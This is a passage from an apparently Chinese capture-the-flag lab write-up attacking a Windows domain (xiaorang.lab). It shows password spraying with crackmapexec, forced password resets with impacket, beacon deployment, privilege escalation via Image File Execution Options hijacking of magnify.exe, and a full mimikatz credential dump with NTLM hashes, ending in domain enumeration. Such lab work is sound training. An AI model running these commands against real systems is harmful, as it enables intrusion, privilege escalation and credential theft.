src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741444718790-7ec5853d-4274-41d0-89f1-5d6beac98d4b.png"></p><p>看一下网络</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net use</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741444913017-4d52ed6c-9bbb-4777-a74a-c3d27f969e74.png"></p><p>读取一下共享文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\TSCLIENT\C</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741445001474-2d5f5420-ae6c-449f-88dc-e0ef461980c5.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell type \\tsclient\c\credential.txt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741445055034-473b7f38-cc62-4455-b4f4-e799c249b3de.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#</span><br></pre></td></tr></table></figure><p>提示映像劫持，起个代理,kali密码喷洒一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q crackmapexec smb 172.22.8.0/24 -u &#x27;Aldrich&#x27; -p &#x27;Ald@rLMWuy7Z!#&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741446240773-bb137f87-a0c6-4990-b0b8-181e6672be95.png"></p><p>登陆的话会过期，这边kalirdp登陆改密码和利用impacket改都可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbpasswd xiaorang.lab/Aldrich:&#x27;Ald@rLMWuy7Z!#&#x27;@172.22.8.15 -newpass &#x27;Calmsec1!&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 172.22.8.46</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741447925599-9ba3f1fa-aa1b-4a14-8662-09aabef0462a.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">172.22.8.15 rdp不上</span><br><span class="line">172.22.8.31 登不了</span><br><span class="line">172.22.8.46 成功登录</span><br></pre></td></tr></table></figure><p>利用第一台win转发上线一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448063842-2e1fa2df-6c72-4884-8b10-a5ec19dae597.png"></p><p>再用这个监听器，生成个马</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448135705-8c08e0d8-23dd-4cb0-af1d-dcbb1cd1d9e5.png"></p><p>把生成的🐎传到8.46上去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448228147-a182c7cf-589f-4f6b-b37e-f9d48fb7c722.png"></p><p>运行一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448264695-8356a888-7f2f-45b4-93e7-f57090fa4043.png"></p><h2 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h2><p>映像劫持提权，先查看权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get-acl -path &quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot; | fl *</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448348642-c2c5ed78-479c-4d44-bcfc-35bc9d0c7e15.png"></p><p>这里我们发现所有正常登录的用户都可以修改注册表，利用这个性质，修改注册表映像劫持，使用放大镜进行提权，其实也就是把本来用户主页点放大镜启动的magnify.exe替换成C:\windows\system32\cmd.exe，这样就直接提权成system了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448414949-60f9ecb4-bc63-4823-a9d5-771bb3ee383b.png"></p><p>接着锁定</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448467481-3bef3f71-fc9b-42b7-aede-ef0c42ea7634.png"></p><p>点一下放大镜</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448495441-30436640-c5bf-4733-a638-ea73314f06d1.png"></p><p>拿到system</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448511939-73fff185-971f-45cd-b2ed-01dba133f81d.png"></p><p>此时再运行上传的马，拿到system的🐎</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448672587-ff6a7d36-7d89-44b7-b29f-6aaafd4fc075.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell type C:\Users\Administrator\flag\flag02.txt</span><br></pre></td></tr></table></figure><p>拿到第二个flag</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741449116342-55a2b929-81fa-449c-ad59-213b9ac3c716.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logonpasswords</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : WIN2016$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:26:49</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 40af44e61e8174dfa92f90a696be81e8</span><br><span class="line"> * SHA1     : 378b412b2e447892d8b92acde54467d5b41f3a3c</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : win2016$</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : 37 b1 92 79 03 15 71 7b 30 27 db aa bf 8e cb 2b 01 22 6b 2f 20 4d 72 67 e9 99 f1 48 7b f3 31 df d3 b6 c7 67 0e 42 aa f4 a6 0f 08 b3 db f8 44 af c5 af 2e d7 a5 30 82 be 43 13 a4 4a 45 ba 8f f9 be af 75 f9 fb 4b e1 10 31 a7 0d a7 ab 93 f9 45 d2 3f 04 51 08 80 24 b0 f4 eb 39 a6 9b 77 f6 b3 ff 02 0b 66 ec 00 9c b6 8b c3 0b 0a 11 5a b3 4f 7f 26 ad cd de d3 35 62 fa 1a 25 87 d4 83 f2 3b 5b 60 88 b3 51 7c 81 5f 02 3a ec 2e 2d 9c 9c a6 ed bb 87 b7 6c 3e 77 75 46 47 b3 7c 9a c0 e7 cb 18 a1 ff 36 e9 5f bc 75 97 68 52 7a 05 b0 41 83 30 20 2f f5 67 9d 2f 96 7b 45 cb 61 f8 28 7a 1f 83 1d e7 cb 88 72 23 d1 f7 10 99 13 d1 5c 1e 12 7d ed 4c f8 f0 9b 01 cd ca ba 8c 10 e3 e8 4d ab be 56 ce 33 86 f5 81 68 42 17 6b 3f 22 a0 dd 29 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 851871 (00000000:000cff9f)</span><br><span class="line">Session           : RemoteInteractive from 2</span><br><span class="line">User Name         : Aldrich</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : DC01</span><br><span class="line">Logon Time        : 2025/3/8 23:33:01</span><br><span class="line">SID               : S-1-5-21-3289074908-3315245560-3429321632-1105</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : Aldrich</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : effdad263995efa4a11f6bc121ef623a</span><br><span class="line"> * SHA1     : 6691986c4240cf9025618b8c34639c226891b86e</span><br><span class="line"> * DPAPI    : 5e4bb4bd0e5ffefa26f4c78b6df8c2a2</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : Aldrich</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : Aldrich</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 829666 (00000000:000ca8e2)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:33:01</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 4ba974f170ab0fe1a8a1eb0ed8f6fe1a</span><br><span class="line"> * SHA1     : e06238ecefc14d675f762b08a456770dc000f763</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 9e ae c4 7a ed ee 91 74 a5 59 61 a5 00 2c c5 00 60 3b 87 48 d0 17 48 cf df 7b 14 af 9a 99 22 b5 94 ba 0a 1e f0 6e f0 25 b1 e2 a2 62 fb b8 68 93 42 64 08 b7 f6 2e f7 cf ae a3 7a 94 9d 32 24 1a b1 6b 87 6c 5e f1 d3 89 c6 c4 8b d3 bd 05 9c b0 e1 85 d4 2c 03 56 5f af 09 15 12 10 df 74 e7 4c d3 65 55 d8 ab bd b4 71 5c 8c a7 bd 14 60 8b 44 b5 d8 d8 61 23 f1 4f 4d 8e a0 dc ac 8a 60 15 0d f7 9f a1 85 98 c4 cf 34 ec ee ea c5 b9 5b 42 8b 97 cc 4d ed 1f db 8c b4 45 06 ce 40 fc 81 96 ac c3 61 e5 e9 42 90 69 f3 b2 85 fa 80 59 e2 8b a5 f6 70 5d 1a bd 5f b1 85 6b ae b0 16 42 29 2c 99 57 fb 49 ea e3 29 49 56 55 6c 9a 2b ee 13 77 fe d7 a3 51 b8 01 ec bb 60 22 b8 7c 2f f5 6b 0f 6b 87 36 76 45 81 7e e3 71 0a a8 ca 2a a3 a6 05 64 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 828954 (00000000:000ca61a)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:33:01</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 40af44e61e8174dfa92f90a696be81e8</span><br><span class="line"> * SHA1     : 378b412b2e447892d8b92acde54467d5b41f3a3c</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 37 b1 92 79 03 15 71 7b 30 27 db aa bf 8e cb 2b 01 22 6b 2f 20 4d 72 67 e9 99 f1 48 7b f3 31 df d3 b6 c7 67 0e 42 aa f4 a6 0f 08 b3 db f8 44 af c5 af 2e d7 a5 30 82 be 43 13 a4 4a 45 ba 8f f9 be af 75 f9 fb 4b e1 10 31 a7 0d a7 ab 93 f9 45 d2 3f 04 51 08 80 24 b0 f4 eb 39 a6 9b 77 f6 b3 ff 02 0b 66 ec 00 9c b6 8b c3 0b 0a 11 5a b3 4f 7f 26 ad cd de d3 35 62 fa 1a 25 87 d4 83 f2 3b 5b 60 88 b3 51 7c 81 5f 02 3a ec 2e 2d 9c 9c a6 ed bb 87 b7 6c 3e 77 75 46 47 b3 7c 9a c0 e7 cb 18 a1 ff 36 e9 5f bc 75 97 68 52 7a 05 b0 41 83 30 20 2f f5 67 9d 2f 96 7b 45 cb 61 f8 28 7a 1f 83 1d e7 cb 88 72 23 d1 f7 10 99 13 d1 5c 1e 12 7d ed 4c f8 f0 9b 01 cd ca ba 8c 10 e3 e8 4d ab be 56 ce 33 86 f5 81 68 42 17 6b 3f 22 a0 dd 29 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 995 (00000000:000003e3)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : IUSR</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:26:53</span><br><span class="line">SID               : S-1-5-17</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:26:50</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 54890 (00000000:0000d66a)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:26:50</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 4ba974f170ab0fe1a8a1eb0ed8f6fe1a</span><br><span class="line"> * SHA1     : e06238ecefc14d675f762b08a456770dc000f763</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 9e ae c4 7a ed ee 91 74 a5 59 61 a5 00 2c c5 00 60 3b 87 48 d0 17 48 cf df 7b 14 af 9a 99 22 b5 94 ba 0a 1e f0 6e f0 25 b1 e2 a2 62 fb b8 68 93 42 64 08 b7 f6 2e f7 cf ae a3 7a 94 9d 32 24 1a b1 6b 87 6c 5e f1 d3 89 c6 c4 8b d3 bd 05 9c b0 e1 85 d4 2c 03 56 5f af 09 15 12 10 df 74 e7 4c d3 65 55 d8 ab bd b4 71 5c 8c a7 bd 14 60 8b 44 b5 d8 d8 61 23 f1 4f 4d 8e a0 dc ac 8a 60 15 0d f7 9f a1 85 98 c4 cf 34 ec ee ea c5 b9 5b 42 8b 97 cc 4d ed 1f db 8c b4 45 06 ce 40 fc 81 96 ac c3 61 e5 e9 42 90 69 f3 b2 85 fa 80 59 e2 8b a5 f6 70 5d 1a bd 5f b1 85 6b ae b0 16 42 29 2c 99 57 fb 49 ea e3 29 49 56 55 6c 9a 2b ee 13 77 fe d7 a3 51 b8 01 ec bb 60 22 b8 7c 2f f5 6b 0f 6b 87 36 76 45 81 7e e3 71 0a a8 ca 2a a3 a6 05 64 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 54870 (00000000:0000d656)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:26:50</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 40af44e61e8174dfa92f90a696be81e8</span><br><span class="line"> * SHA1     : 378b412b2e447892d8b92acde54467d5b41f3a3c</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 37 b1 92 79 03 15 71 7b 30 27 db aa bf 8e cb 2b 01 22 6b 2f 20 4d 72 67 e9 99 f1 48 7b f3 31 df d3 b6 c7 67 0e 42 aa f4 a6 0f 08 b3 db f8 44 af c5 af 2e d7 a5 30 82 be 43 13 a4 4a 45 ba 8f f9 be af 75 f9 fb 4b e1 10 31 a7 0d a7 ab 93 f9 45 d2 3f 04 51 08 80 24 b0 f4 eb 39 a6 9b 77 f6 b3 ff 02 0b 66 ec 00 9c b6 8b c3 0b 0a 11 5a b3 4f 7f 26 ad cd de d3 35 62 fa 1a 25 87 d4 83 f2 3b 5b 60 88 b3 51 7c 81 5f 02 3a ec 2e 2d 9c 9c a6 ed bb 87 b7 6c 3e 77 75 46 47 b3 7c 9a c0 e7 cb 18 a1 ff 36 e9 5f bc 75 97 68 52 7a 05 b0 41 83 30 20 2f f5 67 9d 2f 96 7b 45 cb 61 f8 28 7a 1f 83 1d e7 cb 88 72 23 d1 f7 10 99 13 d1 5c 1e 12 7d ed 4c f8 f0 9b 01 cd ca ba 8c 10 e3 e8 4d ab be 56 ce 33 86 f5 81 68 42 17 6b 3f 22 a0 dd 29 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 25098 (00000000:0000620a)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:26:49</span><br><span class="line">SID               : </span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 40af44e61e8174dfa92f90a696be81e8</span><br><span class="line"> * SHA1     : 378b412b2e447892d8b92acde54467d5b41f3a3c</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line">kerberos :</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : WIN2016$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:26:49</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : win2016$</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : 37 b1 92 79 03 15 71 7b 30 27 db aa bf 8e cb 2b 01 22 6b 2f 20 4d 72 67 e9 99 f1 48 7b f3 31 df d3 b6 c7 67 0e 42 aa f4 a6 0f 08 b3 db f8 44 af c5 af 2e d7 a5 30 82 be 43 13 a4 4a 45 ba 8f f9 be af 75 f9 fb 4b e1 10 31 a7 0d a7 ab 93 f9 45 d2 3f 04 51 08 80 24 b0 f4 eb 39 a6 9b 77 f6 b3 ff 02 0b 66 ec 00 9c b6 8b c3 0b 0a 11 5a b3 4f 7f 26 ad cd de d3 35 62 fa 1a 25 87 d4 83 f2 3b 5b 60 88 b3 51 7c 81 5f 02 3a ec 2e 2d 9c 9c a6 ed bb 87 b7 6c 3e 77 75 46 47 b3 7c 9a c0 e7 cb 18 a1 ff 36 e9 5f bc 75 97 68 52 7a 05 b0 41 83 30 20 2f f5 67 9d 2f 96 7b 45 cb 61 f8 28 7a 1f 83 1d e7 cb 88 72 23 d1 f7 10 99 13 d1 5c 1e 12 7d ed 4c f8 f0 9b 01 cd ca ba 8c 10 e3 e8 4d ab be 56 ce 33 86 f5 81 68 42 17 6b 3f 22 a0 dd 29 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net user /domain</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">这项请求将在域 xiaorang.lab 的域控制器处理。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\\DC01.xiaorang.lab 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Aldrich                  Guest                    </span><br><span class="line">krbtgt                   </span><br><span class="line">命令运行完毕，但发生一个或多个错误</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">这项请求将在域 xiaorang.lab 的域控制器处理。</span><br><span class="line"></span><br><span class="line">组名     Domain Admins</span><br><span class="line">注释     指定的域管理员</span><br><span class="line"></span><br><span class="line">成员</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            WIN2016$                 </span><br><span 